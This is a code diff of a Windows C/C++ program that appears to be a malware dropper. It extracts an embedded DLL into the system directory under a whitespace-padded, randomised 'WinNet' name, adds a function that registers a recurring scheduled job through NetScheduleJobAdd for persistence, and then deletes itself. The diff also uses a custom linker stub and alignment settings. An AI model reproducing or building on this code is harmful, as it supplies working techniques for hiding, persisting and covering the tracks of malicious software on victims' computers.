@@ -3,8 +3,58 @@
 #include "resource.h"
 #include <windows.h>
 #include "TLHELP32.H"
-#pragma comment(linker,"/OPT:NOWIN98")
+#include <lmcons.h>
+#include <lmat.h>
+
+#pragma comment(lib,"NETAPI32.LIB")
+
+#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
 #pragma comment(linker, "/STUB:stub.bin")
+
+BOOL GetSystemVer()
+{
+	OSVERSIONINFOEX osvi;
+	ZeroMemory(&osvi,sizeof(OSVERSIONINFOEX));
+	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+	if(!GetVersionEx((OSVERSIONINFO *)&osvi))
+		return FALSE;
+	
+	switch (osvi.dwPlatformId)
+	{
+	case VER_PLATFORM_WIN32_NT:
+		if (osvi.dwMajorVersion == 6)
+		{
+			return true;
+		}
+		else
+		{
+			return false;
+		}
+		break;
+		
+	case VER_PLATFORM_WIN32_WINDOWS:
+		return false;
+		break;
+		
+	default:
+		return false;
+    }
+	
+	return TRUE;
+}
+
+void JobAdd(WCHAR FilePath[])
+{
+	DWORD JobId;
+	AT_INFO ai;
+	memset(&ai,0,sizeof(ai));
+	ai.Command = FilePath;
+	ai.DaysOfMonth = 0;
+	ai.DaysOfWeek = 0x60;
+	ai.Flags = JOB_RUN_PERIODICALLY;
+	ai.JobTime = 11*60*60*1000+50*60*1000;
+	NetScheduleJobAdd(NULL, LPBYTE(&ai), &JobId);
+}
 
 int SEU_RandEx(int min, int max)
 {
@@ -115,17 +165,8 @@ int APIENTRY WinMain(HINSTANCE hInstance,
     GetSystemDirectory(szSysPath, MAX_PATH);
 	wsprintf(szDllPath,"%s\\WinNet                                               %c.dll",szSysPath,SEU_RandEx('a','z'));
 
-	ReleaseResource(NULL, IDR_DLL, "DLL", szDllPath);//释放DLL文件
+	ReleaseResource(NULL, IDR_DLL, "DLL", szDllPath);
 
-    HMODULE hModule = LoadLibrary(szDllPath);
-	if (hModule)
-	{
-		BOOL (_stdcall *InstallFuc)(LPCSTR szDllPath);
-		(FARPROC&)InstallFuc= GetProcAddress(hModule,"Install");
-		if(InstallFuc) InstallFuc(szDllPath);
-		FreeLibrary(hModule);
-	}
-
-	DelSelf();                           //自删除
+	DelSelf();
 	return 0;
 }
